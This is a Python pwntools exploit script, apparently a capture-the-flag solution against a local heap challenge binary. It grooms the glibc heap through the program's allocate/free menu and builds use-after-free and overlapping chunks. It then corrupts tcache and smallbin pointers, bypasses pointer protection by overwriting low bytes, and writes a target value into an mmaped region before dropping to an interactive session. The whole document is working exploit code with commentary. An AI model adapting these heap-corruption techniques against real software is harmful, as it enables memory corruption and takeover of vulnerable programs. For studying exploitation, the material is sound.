```py
#!/usr/bin/env python3
from pwn import *

elf = ELF('./chal')

alloc_count = -1

def menu():
    return p.recvuntil(b'> ')

def malloc(size, data, offset=0):
    global alloc_count
    print("[%s]malloc(%s)" % (alloc_count+1, hex(size)))
    p.sendline(b'1')
    p.sendlineafter(b'Allocation size: ', str(size).encode())
    p.sendlineafter(b'Write offset: ', str(offset).encode())
    p.sendafter(b'Data for buffer: ', data)
    alloc_count += 1
    menu()
    return alloc_count

def free(idx):
    print("free(%s)" % idx)
    p.sendline(b'2')
    p.sendlineafter(b'Free idx: ', str(idx).encode())
    menu()

p = process(elf.path)
menu()


#####################################
#           Prep allocations        #
#####################################

# This is the chunk size we will be working with to move normal chunks 
# into the unsorted bin before we move them into the smallbin
mal_size = 0x88

# create some dangling pointer for later use by using heap fung shui:
head_chks = []
head_chks.append(malloc(0x18, b'head')) # diff chunk

strong_pointer = malloc(0x18, 'head')  # -\ this chunk is used later -
head_chks.append(strong_pointer) # -------/ by overwrite its LSB to hijack the tcache structure

head_chks.append(malloc(0x18, b'head')) # -----------\
head_chks.append(malloc(0x18, b'head')) # ----------- > rest of size needed create 0x110 chunk sized when consolidate
head_chks.append(malloc(mal_size, b'head_last')) # --/


# Make allocations for exhausting t-cache for later
tcache_0x90 = []
tcache_0x1b0 = []
tcache_0x20 = []
for i in range(7):
    tcache_0x90.append(malloc(mal_size, b'TCACHE_FUEL'))
for i in range(7):
    tcache_0x1b0.append(malloc(0x1a8, b'TCACHE_FUEL'))
for i in range(7):
    tcache_0x20.append(malloc(0x18, b'TCACHE_FUEL'))

# Prep the allocation for two large unosrted bin entries with the ability
# to create a UAF
malloc(0x18, b'GUARD 1')
a1 = malloc(mal_size, b'A1'*(mal_size//2))
b1 = malloc(mal_size, b'B1'*(mal_size//2))
c1 = malloc(mal_size, b'C1'*(mal_size//2))
d1 = malloc(mal_size, b'D1'*(mal_size//2))
malloc(0x18, b'GUARD 2')
a2 = malloc(mal_size, b'A2'*(mal_size//2))
b2 = malloc(mal_size, b'B2'*(mal_size//2))
c2 = malloc(mal_size, b'C2'*(mal_size//2))
d2 = malloc(mal_size, b'D2'*(mal_size//2))
malloc(0x18, b'GUARD 3')

# Fill up the 0x90 t-cache
for i in tcache_0x90:
    free(i)

# Fill up the 0x20 t-cache
for i in tcache_0x20:
    free(i)

# consolidate our head chunks into one large chunk so we could free it into unsortedbin and then into the small bin and hijack the tcache by overwrite its LSB inside the two other chunks in the small bin free list  
for head in head_chks:
    free(head)
malloc(0x500, b'large') 

# overwrite dangling pointers size fields for later use
head_alloc = malloc(0x108, p64(0)*2 + p64(0)+p64(0x341) + p64(0)*2 + p64(0)+p64(0x350))

#########################################################
#           Create the UAF setup for later              #
#########################################################
free(a1)
free(b1)
free(c1)

free(a2)
free(b2)
free(c2)


unsorted2 = malloc(0x1a8, b'2'*0x118+p64(0x331))
unsorted1 = malloc(0x1a8, b'1'*0x118+p64(0x321))

free(c1) # 0x321 t-cache entry
free(c2) # 0x331 t-cache entry
free(unsorted2)
free(unsorted1)

unsorted1 = malloc(0x1a8, b'1'*mal_size+p64(0xe1))
unsorted2 = malloc(0x1a8, b'2'*mal_size+p64(0xf1))

# exhaust t-cache for later use
for i in tcache_0x1b0:
    free(i)

free(b1) # 0xe1 chunk entry
free(b2) # 0xf1 chunk entry
#########################################################
#       Fit the unsorted chunks to fit in the UAF       #
#########################################################

# Fit unsorted 1
free(unsorted1)
free(d1)

malloc(0x38, b'X')
malloc(0x48, b'X')
malloc(0x38, b'X')
malloc(0x58, b'X')

unsorted_f1 = malloc(0x108, b'Y'*mal_size)

# Fit unsorted 2
free(unsorted2)
free(d2)

malloc(0x38, b'X')
malloc(0x48, b'X')
malloc(0x38, b'X')
malloc(0x58, b'X')

unsorted_f2 = malloc(0x108, b'Z'*mal_size)

#################################################################
#               Create the two unsorted entries                 #
#################################################################
tcache_0x110 = []
for i in range(8):
    tcache_0x110.append(malloc(0x108, b'^'*0x108))
for i in tcache_0x110:
    free(i)

###############
# Free chunks #
###############

free(unsorted_f1) # Start of unsorted bin

free(head_alloc) # This will be hijacked for later

free(unsorted_f2) # End of unsorted bin

malloc(0x500, b'large') # sort the chunks free list from unsorted bin into the small bin


#############################################################################################
# Change the FWD and BCK pointers of the small bin entires to our faked chunk in mgmt       #
#############################################################################################

malloc(0xd8, p8(0x00), 0xa8) # BCK
malloc(0xe8, p8(0x00), 0xa0) # FWD 

free(strong_pointer) # we will use this pointer to hijack tcache entry

### clean the 0x110 tcache bin so we could allocate our fake chunk from the small bin ###
for _ in range(7):
    malloc(0x108, b'%')

### first allocate the two other chunk we free'd ###
_ = malloc(0x108, b'&')
_ = malloc(0x108, b'%')

### allocate our fake chunk, and craft a fake size for later allocations so we could use it again
tcache_overlap = malloc(0x108, p64(0)+p64(0x201) + p8(0x20))

# Note: prep chunk - the chunk that the prep function allocate and place the mmap pointer inside it

# overwrite head_alloc size field, later we will overwrite its LSB again so we could allocate the prep chunk
mgmt = malloc(0x330, p64(0)+p64(0x371), 0x70)
free(mgmt)

###########################
#   Bypass protect_ptr    #
###########################

# overwrite prep chunk size field, 
# now it will place at the bottom of the tcache so we can use the mmaped pointer as its next pointer 
mgmt = malloc(0x1f8, p64(0)+p64(0x381), 0x90)
free(mgmt)

# free head_alloc again to overwrite its LSB so it now points to the prep chunk
free(head_alloc)
mgmt = malloc(0x1f8, p8(0xa0), 0x20)

# allocate prep chunk, now the mmaped area pointer is on the tcache
prep_chunk = malloc(0x370, b'prep_chunk') 

# allocate temp chunk to increase the count field so we could allocate the mmaped chunk
tmp = malloc(0x360, 'temp') 

free(tmp) # increase 0x370 bin count
free(prep_chunk) # Note: its real userdata size is 0x360 so it will place inside the 0x370 bin

free(mgmt)

# overwrite the LSB of the chunk at the 0x370 bin point to the chunk in the 0x380 bin on the tcache (bypass protect_ptr)
mgmt = malloc(0x1f8, p8(0x40), 0x18)

# allocate the chunk that point to the 0x380 bin
garbage = malloc(0x360, b'garbage')

# finally allocate the mmaped chunk from the 0x370 tcache bin
mmaped_area = malloc(0x360, p64(0x37C3C7F))

###############
# $$$ WIN $$$ #
###############
p.sendline(b'3')

p.interactive()
```
